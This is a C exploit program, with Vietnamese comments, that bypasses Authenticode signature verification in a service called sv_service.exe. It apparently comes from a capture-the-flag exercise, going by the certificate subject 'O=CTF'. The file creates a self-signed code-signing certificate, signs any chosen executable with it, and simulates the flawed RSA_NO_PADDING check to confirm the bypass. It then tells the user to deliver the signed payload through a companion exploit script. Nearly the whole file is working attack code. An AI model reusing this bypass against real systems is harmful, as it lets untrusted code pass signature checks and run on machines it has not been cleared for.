/*
 * sign_bypass.c — Authenticode self-sign bypass cho sv_service.exe
 *
 * Exploit:
 *   sub_462330 @ 0x462330 gọi rsa_pub_dec với RSA_NO_PADDING (push 3 @ 0x462448)
 *   → RSA_public_decrypt không validate padding → luôn trả dương (512)
 *   → sub_462330 trả 0 → sub_462490 trả 1 → exe được chạy
 *
 *   Điều kiện: exe có Authenticode RSA signature với key <= RSA4096
 *
 * Compile (MSVC):
 *   cl sign_bypass.c /link crypt32.lib advapi32.lib
 *
 * Compile (MinGW/gcc):
 *   gcc sign_bypass.c -o sign_bypass.exe -lcrypt32 -ladvapi32
 *
 * Dùng:
 *   sign_bypass.exe <target.exe>
 */

#include <windows.h>
#include <wincrypt.h>
#include <stdio.h>
#include <wchar.h>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")

/* ─── mssign32.dll structures (undocumented, stable từ XP đến Win11) ─── */

typedef struct {
    DWORD    cbSize;
    LPCWSTR  pwszFileName;
    HANDLE   hFile;
} SIGNER_FILE_INFO;

typedef struct {
    DWORD  cbSize;
    DWORD *pdwIndex;
    DWORD  dwSubjectChoice;  /* 1 = file */
    union {
        SIGNER_FILE_INFO *pSignerFileInfo;
    };
} SIGNER_SUBJECT_INFO;

typedef struct {
    DWORD            cbSize;
    PCCERT_CONTEXT   pSigningCert;
    DWORD            dwCertPolicy;   /* 2 = chain không cần trust */
    HCERTSTORE       hCertStore;
} SIGNER_CERT_STORE_INFO;

typedef struct {
    DWORD  cbSize;
    DWORD  dwCertChoice;  /* 2 = from cert store */
    union {
        SIGNER_CERT_STORE_INFO *pCertStoreInfo;
    };
    HWND   hwnd;
} SIGNER_CERT;

typedef struct {
    DWORD  cbSize;
    ALG_ID algidHash;    /* CALG_SHA_256 */
    DWORD  dwAttrChoice; /* 0 = no extra attr */
    union { void *pAttrAuthcode; };
    PCRYPT_ATTRIBUTES psAuthenticated;
    PCRYPT_ATTRIBUTES psUnauthenticated;
} SIGNER_SIGNATURE_INFO;

typedef struct {
    DWORD cbSize;
    DWORD cbBlob;
    BYTE *pbBlob;
} SIGNER_CONTEXT;

typedef HRESULT (WINAPI *PFN_SignerSignEx)(
    DWORD                  dwFlags,
    SIGNER_SUBJECT_INFO   *pSubjectInfo,
    SIGNER_CERT           *pSignerCert,
    SIGNER_SIGNATURE_INFO *pSignatureInfo,
    void                  *pProviderInfo,   /* NULL = default */
    LPCWSTR                pwszHttpTimeStamp,
    PCRYPT_ATTRIBUTES      psRequest,
    PVOID                  pSipData,
    SIGNER_CONTEXT       **ppSignerContext
);

typedef HRESULT (WINAPI *PFN_SignerFreeSignerContext)(SIGNER_CONTEXT *);

/* ─── Helper: wchar_t* từ char* ─── */
static wchar_t *to_wide(const char *s) {
    int n = MultiByteToWideChar(CP_ACP, 0, s, -1, NULL, 0);
    wchar_t *w = (wchar_t *)malloc(n * sizeof(wchar_t));
    if (w) MultiByteToWideChar(CP_ACP, 0, s, -1, w, n);
    return w;
}

/* ─── Bước 1: tạo self-signed RSA2048 code signing cert ─── */
static PCCERT_CONTEXT create_selfsigned_cert(void) {
    /* Subject: CN=TopSecBypass,O=CTF,C=VN */
    CERT_NAME_BLOB nameBlob = {0};
    LPCWSTR subject = L"CN=TopSecBypass,O=CTF,C=VN";
    if (!CertStrToNameW(X509_ASN_ENCODING, subject, CERT_X500_NAME_STR,
                        NULL, NULL, &nameBlob.cbData, NULL)) {
        fprintf(stderr, "[-] CertStrToName (size): %lu\n", GetLastError());
        return NULL;
    }
    nameBlob.pbData = (BYTE *)malloc(nameBlob.cbData);
    if (!CertStrToNameW(X509_ASN_ENCODING, subject, CERT_X500_NAME_STR,
                        NULL, nameBlob.pbData, &nameBlob.cbData, NULL)) {
        fprintf(stderr, "[-] CertStrToName: %lu\n", GetLastError());
        free(nameBlob.pbData);
        return NULL;
    }

    /* Key provider: RSA2048 trong container tạm */
    CRYPT_KEY_PROV_INFO keyInfo = {0};
    keyInfo.pwszContainerName = L"TopSecBypassContainer";
    keyInfo.pwszProvName      = MS_DEF_PROV_W;
    keyInfo.dwProvType        = PROV_RSA_FULL;
    keyInfo.dwFlags           = CRYPT_MACHINE_KEYSET;
    keyInfo.dwKeySpec         = AT_SIGNATURE;

    /* Extension: Code Signing EKU (1.3.6.1.5.5.7.3.3) */
    LPSTR eku_oid = szOID_PKIX_KP_CODE_SIGNING;
    CERT_ENHKEY_USAGE eku = { 1, &eku_oid };
    BYTE eku_encoded[64]; DWORD eku_sz = sizeof(eku_encoded);
    CryptEncodeObject(X509_ASN_ENCODING, szOID_ENHANCED_KEY_USAGE,
                      &eku, eku_encoded, &eku_sz);

    CERT_EXTENSION ext = {0};
    ext.pszObjId   = szOID_ENHANCED_KEY_USAGE;
    ext.fCritical  = FALSE;
    ext.Value.cbData = eku_sz;
    ext.Value.pbData = eku_encoded;

    CERT_EXTENSIONS exts = { 1, &ext };

    /* Tạo cert, lưu vào MY store */
    PCCERT_CONTEXT ctx = CertCreateSelfSignCertificate(
        0,             /* dùng provider mặc định */
        &nameBlob,
        0,
        &keyInfo,
        NULL,          /* SHA1 sig alg mặc định → không sao, chỉ cần RSA key */
        NULL, NULL,    /* start/end time → tự tính */
        &exts
    );

    free(nameBlob.pbData);

    if (!ctx) {
        fprintf(stderr, "[-] CertCreateSelfSignCertificate: %lu\n", GetLastError());
        return NULL;
    }

    /* Thêm vào My store để SignerSignEx truy cập được */
    HCERTSTORE myStore = CertOpenStore(CERT_STORE_PROV_SYSTEM, 0, 0,
                                       CERT_SYSTEM_STORE_CURRENT_USER, L"MY");
    if (myStore) {
        CertAddCertificateContextToStore(myStore, ctx,
                                         CERT_STORE_ADD_REPLACE_EXISTING, NULL);
        CertCloseStore(myStore, 0);
    }

    printf("[+] Cert tao xong\n");
    printf("    Subject : %ls\n", subject);
    printf("    RSA2048 -> EncryptedHash = 256 bytes (<= 512) -> PASS\n");
    return ctx;
}

/* ─── Bước 2: ký file exe bằng mssign32.dll ─── */
static BOOL sign_file(const char *path, PCCERT_CONTEXT certCtx) {
    HMODULE hMsSign = LoadLibraryW(L"mssign32.dll");
    if (!hMsSign) {
        fprintf(stderr, "[-] Khong load duoc mssign32.dll: %lu\n", GetLastError());
        return FALSE;
    }

    PFN_SignerSignEx         fnSignEx   =
        (PFN_SignerSignEx)GetProcAddress(hMsSign, "SignerSignEx");
    PFN_SignerFreeSignerContext fnFree  =
        (PFN_SignerFreeSignerContext)GetProcAddress(hMsSign, "SignerFreeSignerContext");

    if (!fnSignEx || !fnFree) {
        fprintf(stderr, "[-] GetProcAddress SignerSignEx: %lu\n", GetLastError());
        FreeLibrary(hMsSign);
        return FALSE;
    }

    wchar_t *wPath = to_wide(path);

    /* SIGNER_FILE_INFO */
    DWORD dwIndex = 0;
    SIGNER_FILE_INFO fileInfo = { sizeof(SIGNER_FILE_INFO), wPath, INVALID_HANDLE_VALUE };

    SIGNER_SUBJECT_INFO subjectInfo = {0};
    subjectInfo.cbSize         = sizeof(SIGNER_SUBJECT_INFO);
    subjectInfo.pdwIndex       = &dwIndex;
    subjectInfo.dwSubjectChoice = 1;  /* SIGNER_SUBJECT_FILE */
    subjectInfo.pSignerFileInfo = &fileInfo;

    /* SIGNER_CERT_STORE_INFO */
    HCERTSTORE myStore = CertOpenStore(CERT_STORE_PROV_SYSTEM, 0, 0,
                                       CERT_SYSTEM_STORE_CURRENT_USER, L"MY");

    SIGNER_CERT_STORE_INFO storeInfo = {0};
    storeInfo.cbSize       = sizeof(SIGNER_CERT_STORE_INFO);
    storeInfo.pSigningCert = certCtx;
    storeInfo.dwCertPolicy = 2;        /* SIGNER_CERT_POLICY_CHAIN_NO_SETTINGS */
    storeInfo.hCertStore   = myStore;

    SIGNER_CERT signerCert = {0};
    signerCert.cbSize       = sizeof(SIGNER_CERT);
    signerCert.dwCertChoice = 2;       /* SIGNER_CERT_STORE */
    signerCert.pCertStoreInfo = &storeInfo;

    /* SIGNER_SIGNATURE_INFO */
    SIGNER_SIGNATURE_INFO sigInfo = {0};
    sigInfo.cbSize    = sizeof(SIGNER_SIGNATURE_INFO);
    sigInfo.algidHash = CALG_SHA_256;
    sigInfo.dwAttrChoice = 0;  /* SIGNER_NO_ATTR */

    /* Ký file */
    SIGNER_CONTEXT *pCtx = NULL;
    HRESULT hr = fnSignEx(
        0,              /* dwFlags */
        &subjectInfo,
        &signerCert,
        &sigInfo,
        NULL,           /* pProviderInfo = default */
        NULL,           /* pwszHttpTimeStamp = khong timestamp */
        NULL,           /* psRequest */
        NULL,           /* pSipData */
        &pCtx
    );

    if (pCtx) fnFree(pCtx);
    if (myStore) CertCloseStore(myStore, 0);
    free(wPath);
    FreeLibrary(hMsSign);

    if (SUCCEEDED(hr)) {
        printf("[+] Ky thanh cong: %s\n", path);
        return TRUE;
    } else {
        fprintf(stderr, "[-] SignerSignEx HRESULT: 0x%08X\n", (unsigned)hr);
        return FALSE;
    }
}

/* ─── Bước 3: xác minh bằng cách mô phỏng lại sub_462490/sub_462330 ─── */
static void verify_bypass(const char *path) {
    wchar_t *wPath = to_wide(path);

    DWORD enc, content, fmt;
    HCERTSTORE store = NULL;
    HCRYPTMSG  msg   = NULL;

    if (!CryptQueryObject(CERT_QUERY_OBJECT_FILE, wPath,
                          CERT_QUERY_CONTENT_FLAG_PKCS7_SIGNED_EMBED,
                          CERT_QUERY_FORMAT_FLAG_BINARY,
                          0, &enc, &content, &fmt, &store, &msg, NULL)) {
        printf("    CryptQueryObject: FAIL (exe chua co sig) -> BLOCKED\n");
        free(wPath);
        return;
    }

    DWORD cbData = 0;
    CryptMsgGetParam(msg, CMSG_SIGNER_INFO_PARAM, 0, NULL, &cbData);
    BYTE *signerInfo = (BYTE *)LocalAlloc(LMEM_ZEROINIT, cbData);
    CryptMsgGetParam(msg, CMSG_SIGNER_INFO_PARAM, 0, signerInfo, &cbData);

    /* EncryptedHash ở offset 44 (cbData) và 48 (pbData) của CMSG_SIGNER_INFO */
    DWORD *v6       = (DWORD *)signerInfo;
    DWORD  ehCbData = v6[11];  /* EncryptedHash.cbData */

    printf("    Authenticode    : OK\n");
    printf("    EncryptedHash   : %lu bytes\n", ehCbData);
    printf("    RSA_size(CA)    : 512 bytes (DigiCert RSA4096 @ sub_462330)\n");

    if (ehCbData <= 512) {
        printf("    sub_4023A0 call : RSA_public_decrypt(cbData=%lu, ..., RSA_NO_PADDING=3)\n", ehCbData);
        printf("    RSA_padding_check_none: returns 512 (POSITIVE, != -1)\n");
        printf("    sub_462330      : returns 0  -> PASS\n");
        printf("    sub_462490      : returns 1  -> ALLOWED\n");
        printf("    [BYPASS]: THANH CONG!\n");
    } else {
        printf("    EncryptedHash %lu > 512 -> rsa_ossl_public_decrypt returns -1\n", ehCbData);
        printf("    sub_462330 returns 1 -> BLOCKED\n");
    }

    LocalFree(signerInfo);
    CertCloseStore(store, 0);
    CryptMsgClose(msg);
    free(wPath);
}

/* ─── main ─── */
int main(int argc, char *argv[]) {
    printf("=============================================================\n");
    printf("  sv_service Authenticode Bypass  (sub_462330 @ 0x462330)\n");
    printf("  Bug: RSA_NO_PADDING (push 3 @ 0x462448) -> always PASS\n");
    printf("=============================================================\n\n");

    if (argc < 2) {
        fprintf(stderr, "Dung: %s <target.exe>\n", argv[0]);
        fprintf(stderr, "  Vi du: %s E:\\temp\\payload.exe\n", argv[0]);
        return 1;
    }

    const char *targetPath = argv[1];

    if (GetFileAttributesA(targetPath) == INVALID_FILE_ATTRIBUTES) {
        fprintf(stderr, "[-] Khong tim thay file: %s\n", targetPath);
        return 1;
    }

    printf("[1] Tao self-signed RSA2048 code signing cert...\n");
    PCCERT_CONTEXT cert = create_selfsigned_cert();
    if (!cert) return 1;

    printf("\n[2] Ky file: %s\n", targetPath);
    BOOL ok = sign_file(targetPath, cert);
    CertFreeCertificateContext(cert);
    if (!ok) return 1;

    printf("\n[3] Mo phong sub_462490/sub_462330 verify...\n");
    verify_bypass(targetPath);

    printf("\n=============================================================\n");
    printf("  File san sang! Gui qua cmd 0x02 trong sv_exploit.py:\n");
    printf("  Chon [19], nhap path: %s\n", targetPath);
    printf("=============================================================\n");
    return 0;
}
